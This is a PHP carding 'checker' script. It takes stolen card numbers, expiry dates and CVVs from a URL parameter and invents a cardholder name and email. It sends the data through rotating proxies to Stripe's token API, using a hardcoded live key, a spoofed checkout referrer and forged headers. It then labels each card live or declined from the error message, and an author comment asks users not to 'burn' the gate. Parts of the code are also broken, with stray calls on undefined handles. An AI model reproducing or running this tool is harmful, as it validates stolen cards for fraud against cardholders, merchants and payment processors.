<?php
    
    error_reporting(0);
    
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
    function email($nome){
        $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
        return $email;
    }
    $nome = dadosnome();
    $sobrenome = dadossobre();
    $email = email($nome);
    $keys = array(1 => 'pk_live_0ZNpKqv7Jv2gKOoRWp79Kh8G');
    $key = array_rand($keys);
    $keyStripe = $keys[$key];

    $proxy = curl_exec($ch);
    $username = 'usersnoow';
    $password = 'usersnoow';
    $session = mt_rand();
    $proxy = 'br.smartproxy.com:10000';
    $result = curl_exec($curl);
    curl_close($curl);
    if ($result)
    echo $result; 

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_PROXY, $poxySocks); 
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'host: api.stripe.com',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-08530579fdb5229c50cc57d0adf3263c.html?distinct_id=30f895a9-5dc8-e19d-2680-82d9a453a394',
'user-agent: Mozilla/5.0 (Linux; Android 10; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36' ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F8ab9a2f)&referrer=https%3A%2F%2Ftraceit2u.com%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$nome.'+'.$sobrenome.'&card[address_line1]=550+1st+ave&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10016&card[address_country]=United+States&time_on_page=185086&guid=NA&muid=f5d0186c-0eb7-41b8-b32b-0b4148dba222&sid=a74b4e9f-1235-4e3e-91e0-b9557e71248a&key='.$keyStripe);
    //NÃO MUDE MINHA ASSINATURA! E SEGUNDO N QUEIME A GATE E TERCEIRO QQLQR PROBLEMA ME MANDE MSG NO DISCORD!!!!!!!
    $resultado = curl_exec($ch);
    if(strpos($resultado, 'processing_error')) {
        $retorno = getStr2($resultado, 'message": "', '",');
        $live = '<span class="badge badge-success">𝐋𝐈𝐕𝐄 𝐄𝐋𝐎</span> » '.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.' » 𝐑𝐞𝐭𝐨𝐫𝐧𝐨: '.$retorno." » 𝐆𝐚𝐭𝐞: $key » 𝗦𝗟𝗢𝗞𝗘𝗖𝗔𝗥𝗗𝗜𝗡𝗚<br>";
        echo $live;
    }elseif(strpos($resultado, 'security code is incorrect')){
        $retorno = getStr2($resultado, 'message": "', '",');
        $live = '<span class="badge badge-success">𝐋𝐈𝐕𝐄 𝐆𝐄𝐑𝐀𝐃𝐀</span> » '.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.' » 𝐑𝐞𝐭𝐨𝐫𝐧𝐨: '.$retorno." » 𝐆𝐚𝐭𝐞: $key » 𝗦𝗟𝗢𝗞𝗘𝗖𝗔𝗥𝗗𝗜𝗡𝗚<br>";
        echo "$live<br>";
    }elseif(strpos($resultado, 'message')){
        $retorno = getStr2($resultado, 'message": "', '",');
        echo '<span class="badge badge-danger">𝗥𝗘𝗣𝗥𝗢𝗩𝗔𝗗𝗔</span> » '.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.' » 𝐑𝐞𝐭𝐨𝐫𝐧𝐨: '.$retorno." » 𝐆𝐚𝐭𝐞: $key » 𝗦𝗟𝗢𝗞𝗘𝗖𝗔𝗥𝗗𝗜𝗡𝗚<br>";
        
    }elseif(strpos($resultado, 'token')){
        echo '<span class="badge badge-danger">𝗥𝗘𝗣𝗥𝗢𝗩𝗔𝗗𝗔 𝗚𝗔𝗧𝗘</span> » '.$cc.' » '.$mes.' » '.$ano.' » '.$cvv." » 𝐆𝐚𝐭𝐞: $key » 𝗦𝗟𝗢𝗞𝗘𝗖𝗔𝗥𝗗𝗜𝗡𝗚<br>";
    }else {
        echo '<span class="badge badge-danger">𝗥𝗘𝗣𝗥𝗢𝗩𝗔𝗗𝗔 𝗣𝗥𝗢𝗫𝗬</span> » '.$cc.' » '.$mes.' » '.$ano.' » '.$cvv." » 𝗦𝗟𝗢𝗞𝗘𝗖𝗔𝗥𝗗𝗜𝗡𝗚<br>";
    }
    ?>

